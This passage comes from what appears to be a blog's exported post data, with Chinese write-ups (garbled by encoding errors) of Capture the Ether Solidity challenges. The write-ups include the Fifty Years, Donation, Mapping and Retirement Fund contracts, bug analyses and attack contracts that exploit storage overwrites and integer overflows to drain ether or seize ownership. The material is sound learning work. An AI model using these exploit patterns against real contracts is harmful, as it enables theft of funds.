å­—èŠ‚ç çš„hashå€¼ // bytecodeToHash.slice(2,bytecodeToHash.length): åˆ é™¤ `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // å¯¹ str2 è¿›è¡Œhash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); //åˆ¤æ–­ æ˜¯å¦æ»¡è¶³æ¡ä»¶ if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; è®¡ç®—ç»“æœ ![image-20240412144602608](Fuzzy identity&#x2F;image-20240412144602608.png) éœ€è¦ä¸€ä¸ªHelperåˆçº¦ç”Ÿæˆä¸€ä¸ªåœ°å€ï¼Œè„šæœ¬åªæ˜¯è®¡ç®—ï¼Œå¹¶æ²¡æœ‰ç”Ÿæˆåˆçº¦åœ°å€çš„åŠŸèƒ½ã€‚ Helper 1234567891011121314pragma solidity ^0.8.0;contract Helper &#123; function deployed(uint256 salt) public returns (address) &#123; bytes32 _salt = keccak256(abi.encodePacked(salt)); bytes memory bytecode = hex&quot;6060604052341561000f57600080fd5b6102108061001e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610082575b600080fd5b341561005c57600080fd5b6100646100bb565b60405180826000191660001916815260200191505060405180910390f35b341561008d57600080fd5b6100b9600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100e3565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561014b57600080fd5b5af1151561015857600080fd5b5050508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156101be57600080fd5b5af115156101cb57600080fd5b5050506040518051905015156101e057600080fd5b50505600a165627a7a7230582063de817dba94ce175bbb183123a834c18147e9cd341cefbe4d1e5aee5ee963310029&quot;; address hacker; assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), _salt) &#125; return hacker; &#125;&#125; ç”Ÿæˆåˆçº¦åœ°å€ ![image-20240412144612805](Fuzzy identity&#x2F;image-20240412144612805.png) æ ¹æ®è®¡ç®—å‡ºæ¥çš„åˆçº¦åœ°å€ï¼Œç”ŸæˆHackerï¼Œå¹¶è°ƒç”¨å…¶æ”»å‡»å‡½æ•° ![image-20240412144621611](Fuzzy identity&#x2F;image-20240412144621611.png) 3. è§£é¢˜æ”»å‡»åˆçº¦ 123456789101112contract Hack is IName &#123; function name() external view returns (bytes32) &#123; return bytes32(&quot;smarx&quot;); &#125; function attack(address _challenge) public &#123; FuzzyIdentityChallenge challenge = FuzzyIdentityChallenge(_challenge); challenge.authenticate(); require(challenge.isComplete()); &#125;&#125; è°ƒç”¨ attack() ![image-20240412144632715](Fuzzy identity&#x2F;image-20240412144632715.png) è§£é¢˜æˆåŠŸ~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fifty years","slug":"CTFS/capther the ether/Fifty years","date":"2023-04-17T02:30:10.000Z","updated":"2023-04-17T02:30:10.000Z","comments":true,"path":"2023/04/17/CTFS/capther the ether/Fifty years/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/CTFS/capther%20the%20ether/Fifty%20years/","excerpt":"","text":"Fifty years1. é¢˜ç›® 1.1 This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later. All you have to do to complete this challenge is wait 50 years and withdraw the ether. If youâ€™re not that patient, youâ€™ll need to combine several techniques to hack this contract 1.2 æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.21;contract FiftyYearsChallenge &#123; // Contribution ç»“æ„ä½“ä¸­åŒ…å«äº† é‡‘é¢å’Œè§£é”æ—¶é—´ struct Contribution &#123; uint256 amount; uint256 unlockTimestamp; &#125; // Contribution ç±»å‹çš„æ•°ç»„ Contribution[] queue; uint256 head; address owner; function FiftyYearsChallenge(address player) public payable &#123; require(msg.value == 1 ether); // åˆå§‹åŒ–åˆçº¦æ‰€æœ‰è€…ä¸ºç©å®¶ï¼Œå¹¶æŠŠç©å®¶çš„é’±é”èµ·æ¥ï¼Œç›´åˆ°äº”åå¹´ä¹‹åæ‰å¯ä»¥è§£é” owner = player; queue.push(Contribution(msg.value, now + 50 years)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function upsert(uint256 index, uint256 timestamp) public payable &#123; // æ ¡éªŒè°ƒç”¨è€…æ˜¯å¦ä¸ºåˆçº¦æ‰€æœ‰è€… require(msg.sender == owner); // if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. // è¿™é‡Œstorage ä¿®é¥°çš„æ˜¯åˆ›å»ºçš„å¼•ç”¨ï¼Œä¿®æ”¹contribution çš„å€¼ä¹Ÿä¼šå½±å“åˆ° queue[index]çš„å€¼ Contribution storage contribution = queue[index]; // ç›²çŒœè¿™é‡Œæœ‰æ¼æ´ï¼Œè¦†ç›– contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125; &#125; function withdraw(uint256 index) public &#123; require(msg.sender == owner); // ç¡®ä¿ç°åœ¨çš„æ—¶é—´å¤§äºæˆ–ç­‰äºè§£é”æ—¶é—´ require(now &gt;= queue[index].unlockTimestamp); // Withdraw this and any earlier contributions. uint256 total = 0; for (uint256 i = head; i &lt;= index; i++) &#123; total += queue[i].amount; // Reclaim storage. delete queue[i]; &#125; // Move the head of the queue forward so we don&#x27;t have to loop over // already-withdrawn contributions. head = index + 1; msg.sender.transfer(total); &#125;&#125; 2. åˆ†æ2.1 withdrawå‡½æ•°ç›®æ ‡æ˜¯ç›—å–åˆçº¦ä¸­çš„æ‰€æœ‰ ETHï¼Œæ¶‰åŠè½¬è´¦æ“ä½œçš„å‡½æ•°åªæœ‰ withdrawï¼Œè€Œé¢˜ç›®è‡ªå®šä¹‰åˆçº¦æ‰€æœ‰è€…ï¼Œè¦æˆåŠŸè°ƒç”¨withdrawå‡½æ•°åªè¦é€šè¿‡require(now &gt;= queue[index].unlockTimestamp);å³å¯ã€‚é¢˜ç›®åˆå§‹åŒ–äº†queue[0]ï¼Œè¦å°†åˆçº¦ä¸­æ‰€æœ‰çš„ä½™é¢ç›—å–åªèƒ½ä»æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ä¾æ¬¡éå†ã€‚ 2.2 upsertå‡½æ•°123456789101112131415161718function upsert(uint256 index, uint256 timestamp) public payable &#123; // æ ¡éªŒè°ƒç”¨è€…æ˜¯å¦ä¸ºåˆçº¦æ‰€æœ‰è€… require(msg.sender == owner); if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. Contribution storage contribution = queue[index]; // ç›²çŒœè¿™é‡Œæœ‰æ¼æ´ï¼Œè¦†ç›– contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125;&#125; Contribution storage contributionçš„å®šä¹‰ï¼Œæ— ç–‘æ˜¯ä¼šé€ æˆè¦†ç›–çš„é—®é¢˜ï¼Œrequire(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);å¾ˆæ˜æ˜¾å­˜åœ¨æº¢å‡ºçš„é—®é¢˜ã€‚ åˆå› ä¸ºrequire(now &gt;= queue[index].unlockTimestamp);ä¸­çš„indexæ˜¯è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡queue[index].unlockTimestampéª—è¿‡æ—¶é—´é”ï¼Œä½†æ˜¯è¿™æ ·ä¸€æ¥ï¼Œheadçš„å€¼å°†ä¼šè¢«ä¿®æ”¹ï¼Œä»è€Œæ— æ³•ä»å¤´éå†æ•°ç»„ï¼Œä¸èƒ½å°†åˆçº¦ä¸­çš„å…¨éƒ¨é‡‘é¢å–å‡ºã€‚ ä½†æ˜¯ï¼Œå¾ˆæ˜æ˜¾timestampæ˜¯ä¼šè¦†ç›– headçš„å€¼çš„ã€‚å¯ä»¥é€šè¿‡queue[queue.length - 1].unlockTimestamp + 1 days)ä¸Šæº¢æ¥æ¬ºéª—æ–­è¨€ï¼Œå¹¶å°† headçš„å€¼ä¿®æ”¹ä¸º 0ã€‚è€Œæ•°ç»„çš„é•¿åº¦ç”±æ”¯ä»˜çš„ ETHå†³å®šã€‚ï¼ˆå…¶å®è¿™é‡Œçš„amount å’Œ msg.valueå…¬ç”¨ä¸€ä¸ªå­˜å‚¨ä½ç½®ï¼Œå¯¼è‡´queue.lengthæ°¸è¿œç­‰äºmsg.value++ï¼‰ æ‰€ä»¥æˆ‘ä»¬ç»™æ•°ç»„æ·»åŠ ä¸€ä¸ªå…ƒç´ ï¼Œç”¨æ¥æ¬ºéª—require(now &gt;= queue[index].unlockTimestamp);ï¼Œæ‰€ä»¥éœ€è¦ä¸¤æ¬¡è°ƒç”¨upsertå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡ä¸ºäº†ç»™æº¢å‡ºåšå‡†å¤‡ï¼š0 = (0 - 1 days) + 1 daysï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯å®ç°æº¢å‡ºï¼Œè¦†ç›– headçš„å€¼ä¸º 0ã€‚ åˆç”±äº msg.valueå’Œ queue.lengthå…±ç”¨ä¸€ä¸ªå†…å­˜ï¼Œæ‰€ä»¥éœ€è¦æ”¯ä»˜ 2weiETHã€‚ å…·ä½“åˆ†æå¯è§ : é“¾æ¥ 3. è§£é¢˜æ”»å‡»åˆçº¦ 123456789101112131415161718192021contract Hack &#123; FiftyYearsChallenge challenge; function attack(address _challenge) public payable &#123; challenge = FiftyYearsChallenge(_challenge); challenge.upsert.value(1)(999, cal()); challenge.upsert.value(1)(999, 0); challenge.withdraw(1); require(challenge.isComplete()); tx.origin.transfer(address(this).balance); &#125; function cal() internal pure returns (uint256) &#123; uint256 zero = 0; return zero - 1 days; &#125; function() external payable&#123;&#125;&#125; æ”»å‡»é€»è¾‘ å…ˆéƒ¨ç½² Hackï¼Œ æ ¹æ® Hack éƒ¨ç½² challengeï¼Œç„¶åå°†challengeçš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨ attack() å‡½æ•°ï¼Œå¹¶æ”¯ä»˜ 2 weiã€‚ å®Œæˆæ”»å‡» ![image-20240412144507745](Fifty years&#x2F;image-20240412144507745.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Donation","slug":"CTFS/capther the ether/Donation","date":"2023-04-14T02:20:10.000Z","updated":"2023-04-14T02:20:10.000Z","comments":true,"path":"2023/04/14/CTFS/capther the ether/Donation/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/14/CTFS/capther%20the%20ether/Donation/","excerpt":"","text":"Donation1. é¢˜ç›® 1.1 A candidate you donâ€™t like is accepting campaign contributions via the smart contract below. To complete this challenge, steal the candidateâ€™s ether. 1.2 æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.21;contract DonationChallenge &#123; struct Donation &#123; uint256 timestamp; uint256 etherAmount; &#125; Donation[] public donations; address public owner; function DonationChallenge() public payable &#123; require(msg.value == 1 ether); owner = msg.sender; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function donate(uint256 etherAmount) public payable &#123; // amount is in ether, but msg.value is in wei uint256 scale = 10**18 * 1 ether; require(msg.value == etherAmount / scale); Donation donation; donation.timestamp = now; donation.etherAmount = etherAmount; donations.push(donation); &#125; function withdraw() public &#123; require(msg.sender == owner); msg.sender.transfer(address(this).balance); &#125;&#125; 2.åˆ†æ 2.1 æœ¬é¢˜çš„é€šè¿‡è¦æ±‚å°±æ˜¯éœ€è¦æˆ‘ä»¬å°†åˆçº¦ä¸­çš„é’±å…¨éƒ¨å·èµ°ï¼Œåˆçº¦ä¸­èƒ½å¤Ÿè¿›è¡Œè½¬é’±æ“ä½œçš„åªæœ‰withdrawå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªæœ‰å°† require(msg.sender == owner) è¿™ä¸ªæ ¡éªŒé€šè¿‡æ‰å¯ä»¥å°†åˆçº¦ä¸­æ‰€æœ‰çš„é’±è½¬èµ° 2.2 åˆçº¦ä¸­æœ‰ç»“æ„ä½“ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ï¼Œåˆ†ææºç å¯çŸ¥ slot0 çš„ä½ç½®å­˜å‚¨çš„æ˜¯ donationsï¼ˆé‡Œé¢å…·ä½“çš„å…ƒç´ çš„å­˜å‚¨ä½ç½®åœ¨å“ªï¼Œä¹‹å‰é‡åˆ°è¿‡ï¼Œæ¨èæ–‡çŒ®ï¼‰ï¼Œslot1 çš„ä½ç½®å­˜å‚¨çš„æ˜¯ ownerï¼›ä½†åœ¨å‡½æ•°donate ä¸­ æœ‰ä¸€ä¸ªä¸ºæŒ‡æ˜å­˜å‚¨æ–¹å¼çš„å£°æ˜è¯­å¥Donation donationï¼Œè¿™ä¸ªç»“æ„ä½“çš„å£°æ˜é»˜è®¤æ˜¯ storage ç±»å‹çš„ï¼Œæ˜¯éœ€è¦ä¸Šé“¾çš„ï¼Œå½“è°ƒç”¨æ­¤å‡½æ•°çš„æ—¶å€™ï¼Œä¼šè¦†ç›–å…¶ä»–å…¨å±€å˜é‡çš„æ’æ§½ã€‚ 2.3 è¿™æ°å¥½ä¸ºæˆ‘ä»¬ç¯¡æ”¹åˆçº¦æ‰€æœ‰æƒæä¾›äº†å¯èƒ½æ€§ï¼Œåªè¦å°† slot1ä½ç½®çš„å€¼è¦†ç›–ä¸ºæˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·åœ°å€å³å¯æˆåŠŸæ‰§è¡Œwithdrawå‡½æ•°äº† 2.4 éœ€è¦åœ¨ donate å‡½æ•°ä¸­ä¿®æ”¹ slot1çš„å€¼ï¼Œé€šè¿‡ç®€å•çš„æ•°å­¦è®¡ç®—å°±å¯ä»¥äº† æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„è¿™ä¸ªæ”»å‡»åˆçº¦ä¸è¡Œ 1234567891011121314151617181920212223242526272829contract Hack &#123; DonationChallenge challenge; uint256 public etherAmount; function Hack(DonationChallenge _challenge) public &#123; challenge = _challenge; &#125; function computer(uint256 _address) public returns(uint256) &#123; // è®°å½•ä¸‹æˆ‘çš„åœ°å€ï¼Œå¹¶èµ‹å€¼ç»™etherAmountï¼Œæ–¹ä¾¿å‡½æ•°çš„è°ƒç”¨ etherAmount = _address; //ç®—å‡ºæˆ‘è¦æ”¯ä»˜å¤šå°‘wei return (_address / (10 ** 36)); &#125; function att() public payable &#123; //ä¿®æ”¹slot1 å³ ownerçš„å€¼ challenge.donate(etherAmount); // å·é’± challenge.withdraw; &#125; function getAddress() external view returns(address) &#123; return msg.sender; &#125;&#125; tipsï¼šé—®äº†åŒå­¦æ‰çŸ¥é“åŸå› ï¼šâ‘ æ˜¯å› ä¸ºæ²¡ç»™é¢˜ç›®åˆçº¦ä¸­çš„donateå‡½æ•°å‘é€ä¸»å¸ï¼Œè¿‡ä¸äº†donationä¸­çš„è¯­å¥ â‘¡withdrawå‡½æ•°ä¸­çš„ require(msg.sender == owner);æ ¡éªŒè¿‡ä¸å»ï¼Œå› ä¸ºåœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œè°è°ƒç”¨withdrawï¼Œè°å°±æ˜¯msg.sender;åˆçº¦è°ƒç”¨ï¼Œé‚£ä¹ˆmsg.senderå°±æ˜¯åˆçº¦ è¿™æ ·ä¸€æ¥ challenge.withdraw; ä¸­çš„msg.senderå°±æ˜¯ challengeï¼Œæ‰€ä»¥å°±ä¼šæŠ¥é”™ åœ¨0.4çš„ç¼–è¯‘å™¨ä¸­å‘é€ä¸»å¸çš„æ–¹å¼æ˜¯ï¼š challenge.donate.value(msg.value)(etherAmount); 12345678function att() public payable &#123; //ä¿®æ”¹slot1 å³ ownerçš„å€¼ //// address(nameReg).call.value(1 ether)(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;)); challenge.donate.value(msg.value)(etherAmount); // å·é’± // challenge.withdraw; &#125; è¿™æ ·æ”¹å°±å¯ä»¥æˆåŠŸä¿®æ”¹åˆçº¦çš„æ‰€æœ‰è€…äº† 3. è§£é¢˜ 3.1 éƒ¨ç½² DonationChallenge å’Œ Hack åˆçº¦ 3.2 æ”»å‡»ä¹‹å‰ï¼Œå¯ä»¥çœ‹åˆ°åˆçº¦æ‰€æœ‰è€…ä¸æ˜¯æœ¬äºº 3.3 è®¡ç®—å‡ºæˆ‘éœ€è¦æ”¯ä»˜çš„è´¹ç”¨ï¼Œå‚æ•°æ˜¯æˆ‘çš„è´¦æˆ·åœ°å€ 3.4 ä»¥æˆ‘çš„è´¦æˆ·åœ°å€ä¸ºå‚æ•°ï¼Œè®¡ç®—ç»“æœä¸º msg.value è°ƒç”¨ Donation å‡½æ•°ï¼Œå†æ‰§è¡Œ withdrawnå‡½æ•°ï¼Œå°†é’±å–èµ°ï¼Œå†éªŒè¯isCompleteçš„å€¼ æˆåŠŸ","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Mapping","slug":"CTFS/capther the ether/Mapping","date":"2023-04-13T07:20:10.000Z","updated":"2023-04-13T07:20:10.000Z","comments":true,"path":"2023/04/13/CTFS/capther the ether/Mapping/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/CTFS/capther%20the%20ether/Mapping/","excerpt":"","text":"Mapping1. é¢˜ç›® 1.1 Who needs mappings? Iâ€™ve created a contract that can store key&#x2F;value pairs using just an array. 1.2 æºç ï¼š 12345678910111213141516171819pragma solidity ^0.4.21;contract MappingChallenge &#123; bool public isComplete; uint256[] map; function set(uint256 key, uint256 value) public &#123; // Expand dynamic array as needed if (map.length &lt;= key) &#123; map.length = key + 1; &#125; map[key] = value; &#125; function get(uint256 key) public view returns (uint256) &#123; return map[key]; &#125;&#125; 2. åˆ†æ 2.1 æœ€å¼€å§‹é¢˜ç›®æˆ‘æ˜¯ä¸ç†è§£çš„ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹ä¹‹åæ‰çŸ¥é“ï¼Œæ˜¯è¦è®© isComplete çš„å€¼è¿”å›çš„ æ˜¯ true ï¼Œä½†æ˜¯æˆ‘æ˜¯æ— ä»ä¸‹æ‰‹çš„ï¼Œæºç ä¸­æ²¡æœ‰æä¾›ä¿®æ”¹ isComplete å€¼çš„å‡½æ•° 2.2 å»ç½‘ä¸Šæœç´¢è§£é¢˜è¿‡ç¨‹çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†è¯´åªè¦è®©åŠ¨æ€æ•°ç»„ map æº¢å‡ºå°†åŸæ¥ isComplete æ‰€å¤„çš„ slot0ä½ç½® ç»™è¦†ç›–å³å¯å°† æœªèµ‹å€¼çš„ isComplete çš„å€¼è½¬åŒ–ä¸º trueï¼ˆè¿™é‡Œè¿˜æ˜¯ä¸å¤ªç†è§£çš„ï¼‰ 2.3 çŸ¥é“æ€ä¹ˆåšä¹‹åå°±å¯ä»¥åˆ†æå¦‚ä½•å®ç°æ•°ç»„çš„æº¢å‡º a. ä¸€ä¸ªåˆçº¦çš„å­˜å‚¨æœ€å¤§å®¹é‡å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ç»„ï¼Œæœ€åˆå…¨æ˜¯é›¶ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼éƒ½æ˜¯ 32 å­—èŠ‚å®½ï¼Œå¹¶ä¸”æœ‰ 2 ^256ä¸ªè¿™æ ·çš„å€¼ã€‚ç®€å•æ¥è¯´å°±æ˜¯æœ‰ 2^256 ä¸ª key , æ¯ä¸€ä¸ªkeyå¯ä»¥è£…ä¸‹ 32bytesï¼ˆ1uint &#x3D; 1uint256&#x3D;1bytes32&#x3D;32bytesï¼‰é¢˜ç›®è¯´æ˜äº†map æ˜¯uint256 ç±»å‹çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œmap æ•°ç»„ä¸­çš„æ¯ä¸€å…ƒç´ å ç”¨ä¸€ä¸ªslotï¼Œè¿™å°±è¯´æ˜å¯ä»¥ä¸ç”¨è€ƒè™‘å‡ ä¸ªå…ƒç´ æŒ¤åœ¨ä¸€ä¸ªslotçš„æƒ…å†µäº† b. åŠ¨æ€æ•°ç»„åœ¨EVMä¸Šå­˜å‚¨çš„ä½ç½®å¾ˆå¤æ‚ï¼Œä»–ä¼šæ ¹æ®ä½ åŠ¨æ€æ•°ç»„å£°æ˜çš„ä½ç½®ï¼Œå³ slotçš„ä½ç½®è¿›è¡Œhashè®¡ç®—å‡ºç´¢å¼•0å®é™…å­˜å‚¨çš„ä½ç½®ï¼Œä»è€Œå¼€è¾Ÿä¸€æ®µè¿ç»­çš„ç©ºé—´ç”¨äºå­˜å‚¨æ•°æ®å…ƒç´ ï¼Œ å‚è€ƒæ–‡çŒ® c. åˆå› ä¸ºæ•°ç»„æº¢å‡ºä¹‹åï¼Œåˆä¼šä»EVMçš„è™šæ‹Ÿæ•°ç»„ä»ç´¢å¼•ä¸º0çš„ä½ç½®ï¼ˆå³slot0ï¼‰å¼€å§‹å­˜å‚¨ï¼Œå°±ä¼šè¦†ç›–åŸæ¥åˆçº¦ä¸­çš„æ•°æ®ï¼ˆå³isCompleteï¼‰ï¼Œ***æ•°ç»„çš„èµ·å§‹ä½ç½®æ˜¯é€šè¿‡keccak256(bytes32(â€œæ•°ç»„é•¿åº¦æ‰€åœ¨æ’æ§½â€))è®¡ç®—*** d. è®¡ç®— slot0 çš„ä½ç½® ï¼š 12 ** 256 - 1 - uint256(keccak256(slot)) + 1 2.4 æ”»å‡»åˆçº¦ï¼š 123456789101112131415161718192021222324252627contract Hack &#123; MappingChallenge challenge; function Hack(MappingChallenge _challenge) public &#123; challenge = _challenge; &#125; function att(uint256 slot) public&#123; // è®¡ç®—å‡ºmap[0]è¢«hashååˆ†é…çš„ä½ç½® uint start = uint256(keccak256(slot)); //è®¡ç®—å‡ºstart åˆ°EVMæ•°ç»„æœ«å°¾çš„é•¿åº¦ // 2 ** 256 - 1 ==&gt;&gt; æ˜¯EVMæ•°ç»„çš„é•¿åº¦ [0,2 ** 256 - 1] uint length = 2 ** 256 - 1 - start; // æ­¤æ—¶start + length åº”è¯¥æ˜¯ç­‰äº 2 ^ 256 // éªŒè¯äº†çŒœæƒ³ // return start + length; // å› ä¸º 2 ** 256 - 1 + 1 = 0 // return length + 1; challenge.set(length+1, 1); &#125;&#125; 3. è§£é¢˜ 3.1 éƒ¨ç½² MappingChallengeåˆçº¦ï¼Œéƒ¨ç½² Hack åˆçº¦ 3.2 å°†map æ‰€å¤„çš„æ’æ§½ä½ç½®ä½œä¸ºå½¢å‚ï¼Œè°ƒç”¨attå‡½æ•° 3.3 å›åˆ° MappingChallenge åˆçº¦ä¸­æŸ¥çœ‹ isCompleteçš„å€¼å·²ç»å˜æˆäº†true","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Retirement fund","slug":"CTFS/capther the ether/Retirement fund","date":"2023-04-13T06:58:10.000Z","updated":"2023-04-13T06:58:10.000Z","comments":true,"path":"2023/04/13/CTFS/capther the ether/Retirement fund/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/CTFS/capther%20the%20ether/Retirement%20fund/","excerpt":"","text":"Retirement fund1. é¢˜ç›® 1.1 This retirement fund is what economists call a commitment device. Iâ€™m trying to make sure I hold on to 1 ether for retirement. Iâ€™ve committed 1 ether to the contract below, and I wonâ€™t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!). I really donâ€™t want you to have 0.1 of my ether, so Iâ€™m resolved to leave those funds alone until 10 years from now. Good luck! ç¿»è¯‘ï¼š è¿™ä¸ªé€€ä¼‘åŸºé‡‘å°±æ˜¯ç»æµå­¦å®¶æ‰€è¯´çš„æ‰¿è¯ºæœºåˆ¶ã€‚æˆ‘æ­£åœ¨åŠªåŠ›ç¡®ä¿æˆ‘åœ¨é€€ä¼‘æ—¶ä¿ç•™ 1 ä¸ªä»¥å¤ªå¸ã€‚ æˆ‘å·²ç»å‘ä¸‹é¢çš„åˆçº¦æ‰¿è¯ºäº† 1 ä¸ªä»¥å¤ªå¸ï¼Œå¹¶ä¸”åœ¨ 10 å¹´è¿‡å»ä¹‹å‰æˆ‘ä¸ä¼šæ’¤å›å®ƒã€‚å¦‚æœæˆ‘ææ—©é€€å‡ºï¼Œæˆ‘çš„ 10% çš„ä»¥å¤ªå¸ä¼šæµå‘beneficiaryï¼ˆä½ ï¼ï¼‰ã€‚ æˆ‘çœŸçš„ä¸æƒ³è®©ä½ æ‹¥æœ‰æˆ‘çš„ 0.1 ä¸ªä»¥å¤ªå¸ï¼Œæ‰€ä»¥æˆ‘å†³å®šåœ¨ 10 å¹´åå†å•ç‹¬ä½¿ç”¨è¿™äº›èµ„é‡‘ã€‚ç¥ä½ å¥½è¿ï¼ 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.4.21;contract RetirementFundChallenge &#123; uint256 startBalance; address owner = msg.sender; address beneficiary; uint256 expiration = now + 10 years; function RetirementFundChallenge(address player) public payable &#123; require(msg.value == 1 ether); beneficiary = player; startBalance = msg.value; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function withdraw() public &#123; require(msg.sender == owner); if (now &lt; expiration) &#123; // early withdrawal incurs a 10% penalty msg.sender.transfer(address(this).balance * 9 / 10); &#125; else &#123; msg.sender.transfer(address(this).balance); &#125; &#125; function collectPenalty() public &#123; require(msg.sender == beneficiary); uint256 withdrawn = startBalance - address(this).balance; // an early withdrawal occurred require(withdrawn &gt; 0); // penalty is what&#x27;s left msg.sender.transfer(address(this).balance); &#125;&#125; 2.åˆ†æ 2.1 é¢˜ç›®çš„è¦æ±‚æ˜¯å°†åˆçº¦çš„é’±å…¨éƒ¨å–èµ°ï¼Œè€Œä¸æ˜¯å–èµ°åˆçº¦æ‰€æœ‰è€…å‰©ä¸‹çš„é‚£ 0.1 ether 2.2 æ‰€ä»¥æˆ‘ä»¬å°†é‡ç‚¹å…³æ³¨ collectPenalty å‡½æ•°ï¼ŒæˆåŠŸæ‰§è¡Œmsg.sender.transfer(address(this).balance);è¿™è¡Œä»£ç ï¼›è€Œè¦æ‰§è¡Œè¿™è¡Œä»£ç æ‰§è¡Œè¦é€šè¿‡ä¸¤ä¸ªæ ¡éªŒã€‚æ ¡éªŒä¸€ï¼šrequire(msg.sender == beneficiary);éªŒè¯ä½ æ˜¯å¦æ˜¯å—ç›Šäººï¼Œ æ ¡éªŒäºŒï¼šwithdrawn = startBalance - address(this).balance &gt; 0 éªŒè¯åˆçº¦æ‰€æœ‰è€…æ˜¯å¦æå‰å–æ¬¾äº†ï¼Œæå‰å–æ¬¾å°±å¯ä»¥å¾€ä¸‹æ‰§è¡Œ 2.3 ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹æº¢çš„æ–¹æ³•è®© withdrawn çš„å€¼å¤§ 0ï¼Œå°±æ˜¯è®© address(this).balance çš„å€¼å¤§äº 1ehterï¼Œè€Œåˆçº¦ä¸­æ²¡æœ‰å¯ä»¥æ¥æ”¶ä¸»å¸çš„å‡½æ•°ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬ä½¿ç”¨ 